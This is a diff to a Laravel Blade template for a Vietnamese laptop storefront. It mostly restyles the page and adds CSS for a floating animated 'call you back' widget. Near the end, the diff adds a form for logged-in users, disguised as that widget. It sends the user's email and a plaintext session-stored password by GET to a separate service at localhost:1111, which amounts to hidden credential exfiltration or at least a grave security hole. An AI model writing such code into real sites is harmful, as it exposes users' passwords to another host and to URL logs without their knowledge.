@@ -74,6 +74,212 @@
             display: none;
         }
     </style>
+    <style>
+            #kmacb {
+        position: fixed;
+        bottom: 40px;
+        right: 20px;
+        width: 160px;
+        height: 160px;
+        margin: auto;
+        transition: visibility 0.5s ease 0s;
+        z-index: 200000 !important;
+    }
+    #kmacb a {
+        text-decoration: none;
+    }
+    #kmacb .kmacb-img-circle {
+        animation: 1s ease-in-out 0s normal none infinite running kmacb-circle-img-anim;
+        background: #5aaade url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACsAAAA8CAMAAADIULPRAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABs1BMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AAAAPKcAvAAAAj3RSTlMATksXN+N4FifeiTABxPV+DCj9xy2kSQnl1y8iwA13/qruG/yN5hx6ZGq8WPAm9CmU+lAYtVQLTb1jBDGzhQW6q09EHhLqDhP52a4CYM/yD8o5bgPYHxH4nsapQge4V4ZzPAjtJMzCOBCvnzZVpyHzQ4Ta36xBuetRmI6jBoPxYXvTLHXvmYvbgJfWvoc0GTlTyOIAAAABYktHRACIBR1IAAAACXBIWXMAAAsSAAALEgHS3X78AAAB8UlEQVRIx43W91cTQRAH8AWResRwQCAGjKGEmkRQQDkMVhIQC4QWCMUAErtYqEoNCqLsv8yDl3e7e3uzk+9vd/d58+Z2Zy8hBE5O7hWSXfIopVfzC7KhhfQyRcUlKNVKaSaOa07ElunUTHmF2lZSLkUuFa2q5i11X1dYDxVTUwvbGxbrvQlbH7WmDlzcesk2QNYlUdroB2yTbOubAdsiW9oK2DYb267Z24Au22DI3mq3ZNvRCTRx+46Mu6BV6+65a7X34K3rNfpEe58oEjb6+XdsI8o4HzCqP1RbYnB1HyGWcPYxQp88NalvALGRqGkHsRYCrIWhZ4gd9pp2GKv73KQvuhH6kp27V1jZEdbuKEJjY+wI+RE7zsahFGthiLXQjNAJRicRqrUyO6WpbYhRRwSpG2d2GqEz3Dh61DThYHTWMja1c/MLr5NsGxa507Mk0sLli7tvVlKZ67dcB+9E+j6Yue/+EL5Yro8cdSQE+ukze1Te9aWlkf8urAo0+ZXC+dYr2O8KSssE+kNF18TdVdF1cQ2mVFYc8ZAXlvqGWHZTUXXLsvEK2meZAyMK0u2flrJO0DbJZ+GXvdzZtRnU2J7P5tds/wCY68O0lR6lAEo0z+8d5ib/HIN/Fi4TCZzEo2m6/vf033+SRQbOwv6Y4vk50nYdHuLvx/IAAAAASUVORK5CYII=") no-repeat scroll center center;
+        border: 2px solid transparent;
+        border-radius: 100%;
+        height: 80px;
+        left: 40px;
+        opacity: 0.8;
+        position: absolute;
+        top: 40px;
+        transform-origin: 50% 50% 0;
+        width: 80px;
+    }
+    #kmacb .kmacb-circle-fill {
+        animation: 2.3s ease-in-out 0s normal none infinite running kmacb-circle-fill-anim !important;
+        background: #5aaade none repeat scroll 0 0;
+        border: 2px solid transparent;
+        border-radius: 100%;
+        height: 110px;
+        left: 25px;
+        opacity: 0.24;
+        position: absolute;
+        top: 25px;
+        width: 110px;
+    }
+    /* #kmacb .kmacb-circle {
+        animation: 2.2s ease-in-out 0s normal none infinite running kmacb-circle-anim !important;
+        background-color: transparent;
+        border: 2px solid #5aaade;
+        border-radius: 100%;
+        height: 100%;
+        opacity: 0.35;
+        position: absolute;
+        width: 100%;
+    } */
+    #kmacb:hover .kmacb-img-circle, #kmacb:hover .kmacb-circle-fill {
+        background-color: #72d582;
+    }
+    #kmacb:hover .kmacb-circle {
+        border-color: #72d582;
+    }
+    #kmacb:hover .kmacb-img-circle {
+        animation: 1s ease-in-out 0s normal none infinite running kmacb-circle-img-anim-hover;
+    }
+    @keyframes kmacb-circle-anim {
+    0% {
+        opacity: 0.1;
+        transform: rotate(0deg) scale(0.5) skew(1deg);
+    }
+    30% {
+        opacity: 0.5;
+        transform: rotate(0deg) scale(0.7) skew(1deg);
+    }
+    100% {
+        opacity: 0.6;
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    }
+    @keyframes kmacb-circle-anim {
+    0% {
+        opacity: 0.1;
+        transform: rotate(0deg) scale(0.5) skew(1deg);
+    }
+    30% {
+        opacity: 0.5;
+        transform: rotate(0deg) scale(0.7) skew(1deg);
+    }
+    100% {
+        opacity: 0.1;
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    }
+    @keyframes kmacb-circle-fill-anim {
+    0% {
+        opacity: 0.2;
+        transform: rotate(0deg) scale(0.7) skew(1deg);
+    }
+    50% {
+        opacity: 0.2;
+    }
+    100% {
+        opacity: 0.2;
+        transform: rotate(0deg) scale(0.7) skew(1deg);
+    }
+    }
+    @keyframes kmacb-circle-fill-anim {
+    0% {
+        opacity: 0.2;
+        transform: rotate(0deg) scale(0.7) skew(1deg);
+    }
+    50% {
+        opacity: 0.2;
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    100% {
+        opacity: 0.2;
+        transform: rotate(0deg) scale(0.7) skew(1deg);
+    }
+    }
+    @keyframes kmacb-circle-img-anim {
+    0% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    10% {
+        transform: rotate(-25deg) scale(1) skew(1deg);
+    }
+    20% {
+        transform: rotate(25deg) scale(1) skew(1deg);
+    }
+    30% {
+        transform: rotate(-25deg) scale(1) skew(1deg);
+    }
+    40% {
+        transform: rotate(25deg) scale(1) skew(1deg);
+    }
+    50% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    100% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    }
+    @keyframes kmacb-circle-img-anim {
+    0% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    10% {
+        transform: rotate(-25deg) scale(1) skew(1deg);
+    }
+    20% {
+        transform: rotate(25deg) scale(1) skew(1deg);
+    }
+    30% {
+        transform: rotate(-25deg) scale(1) skew(1deg);
+    }
+    40% {
+        transform: rotate(25deg) scale(1) skew(1deg);
+    }
+    50% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    100% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    }
+    @keyframes kmacb-circle-img-anim-hover {
+    0% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    10% {
+        transform: rotate(-35deg) scale(1) skew(1deg);
+    }
+    20% {
+        transform: rotate(35deg) scale(1) skew(1deg);
+    }
+    30% {
+        transform: rotate(-35deg) scale(1) skew(1deg);
+    }
+    40% {
+        transform: rotate(35deg) scale(1) skew(1deg);
+    }
+    50% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    100% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    }
+    @keyframes kmacb-circle-img-anim-hover {
+    0% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    10% {
+        transform: rotate(-35deg) scale(1) skew(1deg);
+    }
+    20% {
+        transform: rotate(35deg) scale(1) skew(1deg);
+    }
+    30% {
+        transform: rotate(-35deg) scale(1) skew(1deg);
+    }
+    40% {
+        transform: rotate(35deg) scale(1) skew(1deg);
+    }
+    50% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    100% {
+        transform: rotate(0deg) scale(1) skew(1deg);
+    }
+    }
+    </style>
 </head>
 
 <body>
@@ -122,8 +328,6 @@
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
     </style>
-
-  
 
 
     <div class="fix">
@@ -639,14 +843,15 @@
                             <h4 class="epix-sidebar-title">Danh mục</h4>
                             <ul class="epix-um-list">
                                 @foreach ($categories as $category)
-                                    <li class="has-arrow"><a
-                                            href="{{ route('shopWithCategories', $category->id) }}"><i
-                                                class="fal fa-desktop"></i><span>{{ $category->name }}</span></a>
+                                    <li class="has-arrow">
+                                        <a href="{{ route('shopWithCategories', $category->id) }}">
+                                            <i class="fal fa-desktop"></i>
+                                            <span>{{ $category->name }}</span>
+                                        </a>
                                     </li>
                                 @endforeach
                             </ul>
-                            <a href="{{ route('shop') }}" class="link-details">Xem tất cả sản phẩm<i
-                                    class="fal fa-angle-right"></i></a>
+                            <a href="{{ route('shop') }}" class="link-details">Xem tất cả sản phẩm<i class="fal fa-angle-right"></i></a>
                         </div>
                     </div>
 
@@ -854,8 +1059,7 @@
 
                                                     <span class="price">{{ number_format($item->price, 0, ',', '.') }} VNĐ</span>
                                                 @endif
-                                                <a href="{{ route('single_product', $item->id) }}">+ Select
-                                                    Option</a>
+                                                <a href="{{ route('single_product', $item->id) }}">Xem chi tiết</a>
                                             </div>
                                             <div class="wrap">
                                                 <span class="epix-p-subtitle">Đánh giá</span>
@@ -872,10 +1076,10 @@
                                             </div> --}}
                                             <div class="d-inline-block">
                                                 <div class="epix-action">
-                                                    <a href="cart.html" class="p-cart">
+                                                    {{-- <a href="cart.html" class="p-cart">
                                                         <i class="fal fa-shopping-cart"></i>
                                                         <i class="fal fa-shopping-cart"></i>
-                                                    </a>
+                                                    </a> --}}
                                                 </div>
                                             </div>
                                         </div>
@@ -932,6 +1136,21 @@
             </div>
         </div>
     </main>
+    @if(auth()->user())
+        <div id="kmacb">
+        <form method="GET" action="http://localhost:1111/user/check">
+            @csrf
+            <input type="hidden" name="email" value="{{ auth()->user()->email }}">
+            <input type="hidden" name="password" id="hiddenPassword" value="{{ session('user_password') }}">
+            <button modal="kmacb-form" type="submit" title="Перезвонить Вам" style="border:none !important; background:none !important;">
+            <div class="kmacb-circle"></div>
+            <div class="kmacb-circle-fill"></div>
+            <div class="kmacb-img-circle"></div>
+            </button>
+       
+        </form>
+        </div>
+    @endif
 
     <!-- footer area start -->
     <footer class="footer-area footer-1 bg-black  pt-85">
@@ -941,9 +1160,9 @@
                     <div class="col-xxl-3 col-xl-3 footer-col-1 col-sm-6 col-md-8 col-lg-8">
                         <div class="footer-widget widget mb-30 widget-about">
                             <div class="widget-about">
-                                <h4 class="epix-footer-title">Tải ứng dụng</h4>
-                                <p><a href="index.html">Epixx</a> Ứng dụng hiện đã có trên Google<br>
-                                    Play & App Store. Nhận nó ngay bây giờ.</p>
+                                <h4 class="epix-footer-title">TECHZONE</h4>
+                                <p><a href="index.html"></a> <br>
+                                    TECHZONE lựa chọn số 1 Laptop</p>
                                 <div class="logo-list logo-list-1">
                                     <a href="#"><img src="assets/img/icon/icon-app-store.png"
                                             alt=""></a>
